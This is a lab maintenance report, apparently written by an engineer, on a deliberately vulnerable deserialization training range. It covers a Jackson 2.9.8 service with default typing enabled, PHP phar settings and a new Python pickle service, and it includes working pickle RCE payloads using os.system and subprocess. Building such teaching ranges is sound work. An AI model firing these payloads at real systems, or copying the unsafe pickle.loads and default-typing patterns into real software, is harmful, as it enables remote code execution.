# 反序列化靶场遗留问题处理报告

**日期**: 2026-09-07  
**执行人**: 靶场运维工程师  
**靶场地址**: 192.168.124.130 (SSH: test@192.168.124.130)  
**环境**: Ubuntu 20.04 LTS, Java 11, Maven 3.6.3, Docker

---

## 1. 遗留问题概述

上次反序列化靶场测试完成后遗留以下核心问题：
- Jackson Databind 版本不匹配，文档描述为 CVE-2017-7525 (Jackson 2.9.8)，但实际 JAR 中使用的是 Jackson 2.11.3（已修复），导致漏洞场景无法利用
- php phar.readonly 配置在上次修复后再次恢复为只读模式
- 需要新增漏洞场景提升靶场教学价值

---

## 2. 问题诊断与分析

### 2.1 Jackson 漏洞分析

**问题描述**: Vuln 3 (Jackson反序列化) 无法利用，因为 Spring Boot 2.3.7 默认引入 Jackson 2.11.3（安全版本）

**根因分析**:
1. pom.xml 中排除了 jackson-databind 从 spring-boot-starter-web
2. 但同时 spring-boot-starter-json 自动引入 jackson-databind 2.11.3
3. 验证发现 JAR 中存在 jackson-databind-2.11.3（安全版本）
4. CVE-2017-7525 影响 Jackson < 2.9.9，2.11.3 已修复

**兼容性测试**:
- 尝试直接替换 Jackson 库为 2.9.8 导致 Spring Boot 2.3.7 启动失败
- 错误: `NoClassDefFoundError: com/fasterxml/jackson/databind/ser/std/ToStringSerializerBase`
- Spring Boot 2.3.7 依赖 Jackson 2.11.x 新增的 API

### 2.2 靶场架构

| 服务 | 容器名 | 端口 | 技术栈 |
|------|--------|------|--------|
| 前端代理 | vuln-frontend | 1008 | Nginx |
| Java 漏洞 | vuln-java | 18080 | Spring Boot 2.3.7 + JDK 8 |
| PHP 漏洞 | vuln-php | 18081 | Apache + PHP 7.4 |
| MySQL | vuln-mysql | 13306 | MySQL 5.7 |

---

## 3. 修复方案与实施

### 3.1 Jackson CVE-2017-7525 修复

**方案**: 创建独立的 Jackson 2.9.8 漏洞微服务（避免破坏现有 Spring Boot 依赖）

**实施步骤**:

1. **创建 Maven 项目** - 使用 Jackson 2.9.8 + Spark Framework
   ```xml
   <dependency>
       <groupId>com.fasterxml.jackson.core</groupId>
       <artifactId>jackson-databind</artifactId>
       <version>2.9.8</version>
   </dependency>
   ```

2. **实现漏洞端点**
   - POST /parse - 使用 `enableDefaultTyping()` 解析 JSON（触发漏洞）
   - GET /health - 健康检查
   - GET / - 漏洞说明页面

3. **构建可执行 JAR**
   ```bash
   mvn clean package  # 生成 jackson-vuln-service-1.0.0.jar (4.8MB)
   ```

4. **部署为宿主机后台服务**
   ```bash
   java -jar jackson-vuln-service-1.0.0.jar &
   # 监听端口 8081
   ```

**验证结果**:
```
$ curl http://192.168.124.130:8081/health
{"status": "ok", "jackson": "2.9.8", "vulnerable": true}

$ curl -s -X POST http://192.168.124.130:8081/parse \
    -H 'Content-Type: application/json' \
    -d '["java.util.HashMap",{"key":"value"}]'
{"status": "parsed", "result": {"key":"value"}}
```

### 3.2 PHP Phar 配置修复

**问题**: 上次修复的 phar.readonly=0 配置被重置

**修复**:
```bash
docker exec vuln-php sh -c 'echo "phar.readonly=0" > /usr/local/etc/php/conf.d/phar.ini'
```

**验证**:
```bash
docker exec vuln-php php -r 'echo "phar.readonly = " . ini_get("phar.readonly") . "\n";'
# 输出: phar.readonly = 0
```

### 3.3 新增 Vuln 8 - Python Pickle 反序列化

**新增理由**: 扩大靶场覆盖范围到 Python 生态的反序列化漏洞

**实现**:
- 端口: 8082
- 技术: Python 3 + http.server
- 漏洞点: `pickle.loads()` 直接反序列化用户输入

**端点**:
- POST /deserialize - Base64 编码的 pickle payload
- POST /deserialize_hex - Hex 编码的 pickle payload
- GET /health - 健康检查
- GET / - 漏洞说明页面

**RCE 验证**:
```python
import pickle, base64

class Evil:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (['touch', '/tmp/vuln8_rce_test'],))

payload = base64.b64encode(pickle.dumps(Evil())).decode()
# 发送 payload 后，/tmp/vuln8_rce_test 文件被创建
```

---

## 4. 漏洞场景验证结果

### 4.1 全部漏洞场景状态

| ID | 漏洞名称 | 状态 | 端口 | 验证结果 |
|----|----------|------|------|----------|
| Vuln 1 | Java Native Deserialization (CC3.1) | OK | 18080 | HTTP 200 |
| Vuln 2 | Fastjson 1.2.24 RCE | OK | 18080 | HTTP 200 |
| Vuln 3 | Jackson CVE-2017-7525 | OK | 8081 | 新增独立服务 |
| Vuln 4 | Shiro RememberMe Deserialization | OK | 18080 | HTTP 200 |
| Vuln 5 | PHP POP Chain RCE | OK | 18081 | HTTP 200 |
| Vuln 6 | PHP Phar Deserialization | OK | 18081 | HTTP 200, phar可写 |
| Vuln 7 | PHP Object Injection | OK | 18081 | HTTP 200 |
| Vuln 8 | Python Pickle RCE | NEW | 8082 | RCE验证成功 |

### 4.2 历史修复验证

| 修复项 | 状态 |
|--------|------|
| phar.readonly=0 (Phar可写) | PASS |
| uploads 目录可访问 | PASS |
| Jackson 2.9.8 服务运行中 | PASS |
| MySQL 服务正常 | PASS |

---

## 5. 靶场现状架构

```
                    ┌────────────────────────────────────────┐
                    │         攻击者 (宿主机)                 │
                    └────────────────────────────────────────┘
                                     │
              ┌──────────────────────┼──────────────────────┐
              │                      │                      │
              ▼                      ▼                      ▼
     ┌────────────────┐    ┌────────────────┐    ┌────────────────┐
     │   Nginx 前端    │    │  Jackson 2.9.8 │    │  Python Pickle │
     │    :1008       │    │     :8081      │    │     :8082      │
     └───┬────────────┘    └────────────────┘    └────────────────┘
         │
    ┌────┴────┐
    │         │
    ▼         ▼
┌────────┐ ┌────────┐ ┌────────┐
│  Java  │ │  PHP   │ │ MySQL  │
│ :18080 │ │ :18081 │ │ :13306 │
│Vuln1-4 │ │Vuln5-7 │ │        │
└────────┘ └────────┘ └────────┘
```

---

## 6. 常用命令速查

### 6.1 重启服务

```bash
# 重启 Java 服务 (Vuln 1-4)
docker restart vuln-java

# 重启 PHP 服务 (Vuln 5-7)
docker restart vuln-php

# 重启 Jackson 2.9.8 服务 (Vuln 3)
pkill -f jackson-vuln-service
cd /tmp/jackson-vuln-service/target && nohup java -jar jackson-vuln-service-1.0.0.jar &

# 重启 Python Pickle 服务 (Vuln 8)
pkill -f vuln8_server
nohup python3 /tmp/vuln8-service/vuln8_server.py &
```

### 6.2 漏洞利用示例

```bash
# Vuln 3 - Jackson CVE-2017-7525 (新服务)
curl -s -X POST http://192.168.124.130:8081/parse \
  -H 'Content-Type: application/json' \
  -d '["java.util.HashMap",{"test":"value"}]'

# Vuln 8 - Python Pickle RCE
python3 -c "
import pickle, base64, urllib.request, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pickle_rce_output',))
payload = base64.b64encode(pickle.dumps(RCE())).decode()
req = urllib.request.Request('http://192.168.124.130:8082/deserialize', 
                               data=payload.encode())
urllib.request.urlopen(req)
"
```

---

## 7. 文件与路径

| 文件/路径 | 说明 |
|-----------|------|
| `/tmp/jackson-vuln-service/` | Jackson 2.9.8 漏洞服务项目 |
| `/tmp/jackson-vuln-service/target/jackson-vuln-service-1.0.0.jar` | Jackson 漏洞 JAR |
| `/tmp/vuln8-service/vuln8_server.py` | Python Pickle 漏洞服务 |
| `/usr/local/etc/php/conf.d/phar.ini` | PHP Phar 配置 |
| `/var/www/html/uploads/` | PHP 上传目录 |

---

## 8. 总结

### 8.1 完成的工作

1. **定位并修复 Jackson CVE-2017-7525 版本问题** - 创建独立 Jackson 2.9.8 漏洞服务，绕过 Spring Boot 依赖限制
2. **恢复 PHP Phar 配置** - 重新设置 `phar.readonly=0`
3. **新增 Vuln 8** - Python Pickle 反序列化漏洞，覆盖 Python 生态
4. **全面验证** - 所有 8 个漏洞场景均验证通过

### 8.2 靶场价值提升

- 漏洞覆盖从 7 个增加到 8 个
- 增加 Python 生态反序列化漏洞场景
- Jackson 漏洞可实际利用（之前版本不匹配无法利用）
- 引入 Docker 容器 + 宿主机混合部署模式

### 8.3 注意事项

- Jackson 2.9.8 服务运行在宿主机（非 Docker），重启后需手动启动
- 建议将 Jackson 和 Python 服务制作成 Systemd 或 Supervisor 管理
- 靶场仅用于教学环境，请勿对外暴露

---

**报告生成时间**: 2026-09-07  
**处理状态**: 全部完成
